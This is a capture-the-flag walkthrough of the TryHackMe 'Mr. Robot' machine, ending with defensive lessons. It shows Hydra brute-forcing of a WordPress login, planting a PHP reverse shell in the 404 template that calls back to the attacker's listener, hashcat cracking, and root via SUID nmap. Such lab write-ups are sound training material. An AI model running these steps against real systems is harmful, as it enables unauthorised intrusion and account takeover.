# Try Hack Me - Mr. Robot

**Categories:** MrRobot, Root, Beginner  
**Difficulty:** Medium  

Commands used in this guide use the exported variable `$IP` (`export IP=10.10.222.86`) in place of the target machine's IP address.

## 1. Enumeration - nmap, gobuster

Having launched the machine, we perform a basic service enumeration scan with nmap :

```console
┌──(kali㉿kali)-[/tmp/dead]
└─sudo nmap -A -oN nmap.out $IP
```

The scan shows one closed port (22) and two open ports : 80 (Apache httpd) and 443 (Apache httpd) :

```console
...snip...
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
...snip...
```

Navigating to the site in the browser reveals some kind of interactive game / advert for the Mr. Robot tv show - manually clicking around seems to show that the applications on 80 and 443 are identical. For more information, we run a gobuster scan with dirbuster's `common.txt` wordlist : 

```console
┌──(kali㉿kali)-[/tmp/dead]
└─$ gobuster dir -u $IP -w /usr/share/dirb/wordlists/common.txt -o gobuster.out
```

This finds a significant number of new routes :

* `/dashboard/`, `/wp-admin/` and `/login/` redirect to a Wordpress login page
* `/0/` redirects to an (empty) blog page associated with the Wordpress instance
* `/wp-links-opml/` discloses the Wordpress version (4.3.1)
* `/phpmyadmin/` indicates that a mysql instance is running on the machine (but is only available from localhost)
* `/xmlrpc.php/` and `/xmlrpc/` show that an xmlrpc server is running on the machine

Unfortunately, the most promising result of the gobuster scan is much more simple - `/robots.txt` :

```console
┌──(kali㉿kali)-[/tmp/dead]
└─$ curl $IP/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
```

curl `$IP/key-1-of-3.txt` for the first flag.

## 2. Foothold 1 : hydra

The `fsocity.dic` file revealed by `/robots.txt` is some kind of wordlist :

```console
┌──(kali㉿kali)-[/tmp/dead]
└─$ curl $IP/fsocity.dic > fsocity.dic && head fsocity.dic 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 7075k  100 7075k    0     0   648k      0  0:00:10  0:00:10 --:--:--  763k
true
false
wikia
from
the
now
Wikia
extensions
scss
window
```

Given that gobuster has already found a login page, we might be tempted to use the wordlist to bruteforce the username and password. But the file is comically massive : 

```console
┌──(kali㉿kali)-[/tmp/dead]
└─$ wc fsocity.dic 
 858160  858160 7245381 fsocity.dic
```

So comically massive that we might suspect that it includes duplicates :

```console
┌──(kali㉿kali)-[/tmp/dead]
└─$ sort -u fsocity.dic > fs_short.txt && wc fs_short.txt
11451 11451 96747 fs_short.txt
```

Perfect - we've already reduced the candidates by around 99%. But brute forcing username _and_ password would still result in 100 million requests in the worst case (10k * 10k - in case you're wondering, this is too many). If we revisit the login page discovered at `/wp-login`, we can see that the error messages differentiate between username and password failures. After a connection attempt with username:password "TESTER:TESTER", the following message is displayed :

```html
  <strong>ERROR</strong>: Invalid username. <a href="http://10.10.222.86/wp-login.php?action=lostpassword">Lost your password?</a>
```

This means we can bruteforce the username and password separately with a worst-case maximum of 22902 requests (the length of `fs_short.txt` * 2). To perform the bruteforce attack, we use Hydra in http-web-form mode, starting with the username and discarding all results that include the text "Invalid username":

```console
┌──(kali㉿kali)-[/tmp/dead]
└─$ hydra -L fs_short.txt -p UNKNOWN 10.10.222.86 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.168.139%2Fwp-admin%2F&testcookie=1:F=Invalid"
...snip..
[80][http-post-form] host: 10.10.222.86   login: DISCOVERED_USERNAME   password: UNKNOWN
```
Having found the username, we repeat the attack for the password, discarding all results that include the text "The password you entered" :

```console
┌──(kali㉿kali)-[/tmp/dead]
└─$ hydra -l DISCOVERED_USERNAME -P fs_short.txt 10.10.222.86 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.168.139%2Fwp-admin%2F&testcookie=1:F=Invalid"   
...snip...
[80][http-post-form] host: 10.10.222.86   login: DISCOVERED_USERNAME   password: DISCOVERED_PASSWORD
```

Enter the discovered credentials at the login page to reach the Wordpress admin dashboard. (While doing this write-up I realiised that these credentials are also hidden on one of the routes discovered by gobuster - I'll leave that exercise to the reader. Try curling the pages if you don't find anything in the browser.)

## 3. Foothold 2 : php reverse shell

Access to the admin dashboard allows us to modify the content of the site. In Wordpress's PHP environment, any code added to an existing page will be executed on the server when that page is requested. To exploit this feature, we'll be using a [PHP reverse shell provided by pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell). Make sure to update the shell with the IP and port of your attack machine on lines 49-50 :

```php
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```
On the admin dashboard, we select "Appearance" -> "Editor" from the menu on the left. We then select the `404.php` template from the "Templates" list on the right, replace the existing code with the updated reverse shell code and click the "Update File" button in the bottom left. We then start a listener on the attack machine and navigate to a route that will return the 404 page (`curl $IP/wp-admin/this-does-not-exist`) : 

```console
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 12321
listening on [any] 12321 ...
connect to [ATTACK_IP] from (UNKNOWN) [10.10.222.86] 45400
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
...snip...
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

## 4. Privesc 1 : hashcat

In `/home` we see the home directory of `robot` user, containing `key-2-of-3.txt` and `password.raw-md5`. As we do not currently have read access to the `key-2-of-3.txt` file, we can assume that we need to crack the hash for `robot`'s password. We copy the hash to the attack box for cracking with hashcat and the rockyou wordlist :

```console
┌──(kali㉿kali)-[~]
└─$ hashcat -m 0 "HASH" rockyou.txt
...snip...
Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

c3fcd3d76192e4007dfb496cca67e13b:PASSWORD
...snip...
```
Use the discovered password to switch to the `robot` user (you'll need to spawn a tty shell with `python -c 'import pty; pty.spawn("/bin/sh")'` or similar) and cat `key-2-of-3.txt` for the second flag.

## 5. Privesc 2 : SUID

From here, we can assume that we need to privesc to root for the final flag. We can perform the usual hunt for privesc vectors here - internal port and service enumeration, cronjobs, SUIDs / SGIDs, etc. We had already seen the `/phpmyadmin/` route in the gobuster scan, and with `ss -tlp` we find the mysql instance, as well as ftp and [monit](https://mmonit.com/monit/) servers :

```console
$ ss -tlp
State      Recv-Q Send-Q      Local Address:Port          Peer Address:Port   
LISTEN     0      32              127.0.0.1:ftp                      *:*       
LISTEN     0      128             127.0.0.1:2812                     *:*       
LISTEN     0      80              127.0.0.1:mysql                    *:*       
LISTEN     0      128                    :::https                   :::*       
LISTEN     0      128                    :::http                    :::* 
```

Attempting to connect to these services doesn't give much luck - no mysql or ftp client is installed in the machine, and `robot` cannot start the ssh service required to provided access from the attack machine through port forwarding. Luckily the search for SUID/SGID binaries is more fruitful : 

```console
robot@linux:/$ find / -perm /4000 2>/dev/null
...snip...
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
...snip...
```
nmap stands out here. [GTFObins](https://gtfobins.github.io/gtfobins/nmap/) provides a number of options for priviledged actions with nmap, including an interactive shell sessions for versions 2.02-5.21. After checking the version of the nmap binary on the machine, we use `--interactive` mode to spawn a root shell :

```console
robot@linux:/$ nmap --version
nmap version 3.81 ( http://www.insecure.org/nmap/ )

robot@linux:/$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id 
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
```

The final key is at `/root/key-3-of-3.txt`.

## Bonus - port forwarding dead ends

As root, we can restart the ssh service (`service start ssh`) allowing port forwarding from the attack machine. This allows us to try to connect to the discovered internal services - ftp, mysql, phpmyadmin, and monit. Here, we forward local traffic on 8080 to 127.0.0.1:80 on the target machine, allowing us to access the phpmyadmin dashboard :

```console
┌──(kali㉿kali)-[~]
└─$ ssh -L 8080:localhost:80 robot@10.10.222.86
```

We can do the same for the other services by changing the target port. I wasn't able to connect to the ftp and mysql instances or the phpmyadmin dashboard using our two known credential pairs (the discovered wordpress admin and the `robot` user), and no additional information was gained from the monit dashboard. We've already got root so I didn't go vulnerability hunting, brute forcing, etc. for these internal services. Let me know if you have any more luck!

## 6. Summary and Solutions

So we saved the world. Or we destroyed the world. I haven't watched Mr. Robot, I don't know who the bad guys are. But what went wrong here in regards to security, and what could have been done to avoid it?

* **Information disclosure, web application** - revealing a credential list in robots.txt or a base64 encoded credential string are pretty heavy ways to make this point, but it helps to know what information is exposed on your services. What could a dedicated attacker do with a list of names and phone numbers, etc.?
* **Information disclosure, error messages** - error messages that distinguish between username and password failures massively reduce the number of requests required to brute force the login page (from n\*n requests to n\*2 requests). [Error messages should not provide information on system configuration.](https://owasp.org/www-community/Improper_Error_Handling). After a quick search, it seems that the "Username invalid" error message is still displayed in the default Wordpress configuration.
* **Password policy** - privesc to the robot user relies on insecure storage of the hash, and a password that is in the best known list of pwnd passwords. Password policy should define and enforce minimum password entropy, and prevent insecure storage of plaintext and hashed passwords (slightly tougher to enforce...).
* **Principle of least privilege** - sudo access to a binary that can provide a shell is root access. When configuring your environment, you should know what your binaries do - [gtobins](https://gtfobins.github.io/) is a great place to start - and why your users need them. Always ensure that privileges are scoped to the absolute minimum level required for users to perform their tasks.